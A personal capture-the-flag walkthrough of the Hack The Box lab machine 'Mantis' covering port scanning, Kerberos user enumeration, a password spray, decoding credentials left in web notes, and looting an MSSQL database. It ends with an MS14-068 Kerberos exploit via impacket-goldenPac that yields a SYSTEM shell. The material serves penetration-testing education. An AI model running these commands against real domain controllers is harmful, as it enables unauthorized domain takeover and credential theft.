# Mantis
## Information Gathering
10.10.10.52

#### Ports/Services
x 53/tcp      domain       
x 88/tcp      tcpwrapped   
x 135/tcp     msrpc        
? 139/tcp     netbios-ssn  
x 389/tcp     ldap         
? 445/tcp     microsoft-ds 
x 464/tcp     tcpwrapped   
x 593/tcp     ncacn_http   
x 636/tcp     tcpwrapped   
? 1337/tcp    http         
1433/tcp    ms-sql-s     
x 3268/tcp    ldap         
x 3269/tcp    tcpwrapped   
x 5722/tcp    msrpc        
8080/tcp    http         
x 9389/tcp    mc-nmf          
x 49157/tcp   ncacn_http          
50255/tcp   ms-sql-s

## Enumeration
### Nmap scan
```bash
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  tcpwrapped   syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  tcpwrapped   syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
1337/tcp  open  http         syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS7
1433/tcp  open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ssl-date: 2022-10-10T21:51:58+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-10-10T21:17:08
| Not valid after:  2052-10-10T21:17:08
| MD5:   5855 f01c ba53 7fa1 eeff 0f91 d9eb 070a
| SHA-1: 84c6 84d5 f91a 843d cc05 50a3 54e1 a50f 4820 e17c
| -----BEGIN CERTIFICATE-----
| MIIB+zCCAWSgAwIBAgIQMv0YW3H6apRPQQvHzgjcezANBgkqhkiG9w0BAQUFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjIxMDEwMjExNzA4WhgPMjA1MjEwMTAyMTE3MDhaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAwHQRAzP3P8Eb
| KNkZ3h248R9BYc4bmdkAoEkM4T4PZpW+qB7Q8ybDq2dDM/Ex28QTMJ922Ltaknj3
| ENwZsOckQgqsNv1w6N6PcqmiMx6H1ySk0PYL3OdgMOfoBIl+QSG78++PbORuDcE7
| b0wVVy8mTLneKk4O9L7XqH2nt+2cB18CAwEAATANBgkqhkiG9w0BAQUFAAOBgQBv
| zYVgA8LJRJR+RP+pr27cTRj4QhrZZxO/osQtV1tQX7R63o+LxY7fdiLnVH2Cq8wK
| 9SvD4x680RVeIgTvot5iYhafZBDaMs33sMuo0XVRcdBUtEutV/MCz1WVbdLYGV5H
| Gff3UjhSwE1GUEfmsEoA/J3CtnQZNG4ixK9tyyGFlw==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5722/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
8080/tcp  open  http         syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49164/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49166/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49168/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
50255/tcp open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2014 12.00.2000
|_ssl-date: 2022-10-10T21:51:58+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-10-10T21:17:08
| Not valid after:  2052-10-10T21:17:08
| MD5:   5855 f01c ba53 7fa1 eeff 0f91 d9eb 070a
| SHA-1: 84c6 84d5 f91a 843d cc05 50a3 54e1 a50f 4820 e17c
| -----BEGIN CERTIFICATE-----
| MIIB+zCCAWSgAwIBAgIQMv0YW3H6apRPQQvHzgjcezANBgkqhkiG9w0BAQUFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjIxMDEwMjExNzA4WhgPMjA1MjEwMTAyMTE3MDhaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAwHQRAzP3P8Eb
| KNkZ3h248R9BYc4bmdkAoEkM4T4PZpW+qB7Q8ybDq2dDM/Ex28QTMJ922Ltaknj3
| ENwZsOckQgqsNv1w6N6PcqmiMx6H1ySk0PYL3OdgMOfoBIl+QSG78++PbORuDcE7
| b0wVVy8mTLneKk4O9L7XqH2nt+2cB18CAwEAATANBgkqhkiG9w0BAQUFAAOBgQBv
| zYVgA8LJRJR+RP+pr27cTRj4QhrZZxO/osQtV1tQX7R63o+LxY7fdiLnVH2Cq8wK
| 9SvD4x680RVeIgTvot5iYhafZBDaMs33sMuo0XVRcdBUtEutV/MCz1WVbdLYGV5H
| Gff3UjhSwE1GUEfmsEoA/J3CtnQZNG4ixK9tyyGFlw==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2022-10-10T17:51:49-04:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3494/tcp): CLEAN (Couldnt connect)
|   Check 2 (port 10637/tcp): CLEAN (Couldnt connect)
|   Check 3 (port 19802/udp): CLEAN (Failed to receive data)
|   Check 4 (port 34485/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2022-10-10T21:51:47
|_  start_date: 2022-10-10T21:16:41
|_clock-skew: mean: 34m15s, deviation: 1h30m44s, median: -2s
```
### OS
- Target_Name: HTB
- NetBIOS_Domain_Name: HTB
- NetBIOS_Computer_Name: MANTIS
- DNS_Domain_Name: htb.local
- DNS_Computer_Name: mantis.htb.local
- DNS_Tree_Name: htb.local
- 64-bit host
- Windows Server 2008 R2 Standard 7601 Service Pack 1

### 53/tcp
- Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)


### 88/tcp
- Microsoft Windows Kerberos

- Performing ASREPRoasting
```bash
kerbrute_linux_amd64 userenum --dc 10.10.10.52 -d htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

2022/10/10 18:39:53 >  [+] VALID USERNAME:       james@htb.local
2022/10/10 18:39:56 >  [+] VALID USERNAME:       James@htb.local
2022/10/10 18:40:06 >  [+] VALID USERNAME:       administrator@htb.local
2022/10/10 18:40:16 >  [+] VALID USERNAME:       mantis@htb.local
2022/10/10 18:40:39 >  [+] VALID USERNAME:       JAMES@htb.local
2022/10/10 18:41:38 >  [+] VALID USERNAME:       Administrator@htb.local
2022/10/10 18:42:31 >  [+] VALID USERNAME:       Mantis@htb.local
```
- Confirmed following users
	- james
	- administrator
	- mantis
- Attempt password spray from Orchard CMS Admin credentials
```bash
crackmapexec smb 10.10.10.52 -d htb.local -u asreproast_users.txt -p '@dm!n_P@ssW0rd!'
```
- No hits

### 135/tcp
- Microsoft Windows RPC

### 139/tcp, 445/tcp
- netbios-ssn
- microsoft-ds
- Appears that I can enumerate using username '', and password '' but cannot retrieve any results

***
- Enumeration after obtaining credentials `james:J@m3s_P@ssW0rd!`
```bash
smbmap -u 'james' -p 'J@m3s_P@ssW0rd!' -H 10.10.10.52

Disk              Permissions     Comment
----              -----------     -------
ADMIN$            NO ACCESS       Remote Admin
C$                NO ACCESS       Default share
IPC$              NO ACCESS       Remote IPC
NETLOGON          READ ONLY       Logon server share 
SYSVOL            READ ONLY       Logon server share
```

### 389/tcp
- Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)

### 1337/tcp
- Software
	- Microsoft IIS 7.5 
	- Powered by ASP.NET
- Default landing page for IIS
- Directory busting /aspnet_client/
```bash
gobuster dir -u http://10.10.10.52:1337/aspnet_client/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,asp,aspx,txt,sh,xml -o gob/1337_root.gob -b 400,403,404

/secure_notes/
```
- There are two files here:
	- dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
	- web.config
- web.config - 404
- dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
```
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.


Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```
- Database is `orcharddb`
- The throwing the binary string into [rapid tables](https://www.rapidtables.com/convert/number/binary-to-ascii.html) and selecting character encoding as ASCII
	- OrchardCMS: `admin:@dm!n_P@ssW0rd!`
	- Gets me access to the dashboard for Orchard CMS
- Reversing file name `NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx`
```bash
echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d
6d2424716c5f53405f504073735730726421
```
- Throwing the hex string into [rapid tables](https://www.rapidtables.com/convert/number/hex-to-ascii.html) and changing character encoding to ASCII
	- `admin:m$$ql_S@_P@ssW0rd!`

### 1433/tcp
- Microsoft SQL Server 2014 12.00.200.00
- Login to MSSQL server
```bash
sqsh -S 10.10.10.52 -U 'admin' -P 'm$$ql_S@_P@ssW0rd!' -D orcharddb
```

- I use Dbeaver
- Once loading the database and authenticating I take a look at the database orcharddb
- There is a table blog_Orchard_UserPartRecord
- Has an entry
	- James
		- email: james@htb.local
		- Password: `J@m3s_P@ssW0rd!`

### 8080/tcp
- Software
	- ASP_NET 4.0.30319
	- MVC5.2
	- Microsoft IIS 7.5 
- Appears to be [Orchard CMS](https://orchardcore.net/)
- Using `admin:@dm!n_P@ssW0rd!` credentials


## Exploitation
This machine is vulnerable to MS14-068. There are two exploits that would work:
- [PyKek](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)
- impacket-goldenPac
I used impacket-goldenPac which drops you right into a SYSTEM shell

```bash
impacket-goldenPac -dc-ip 10.10.10.52 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
```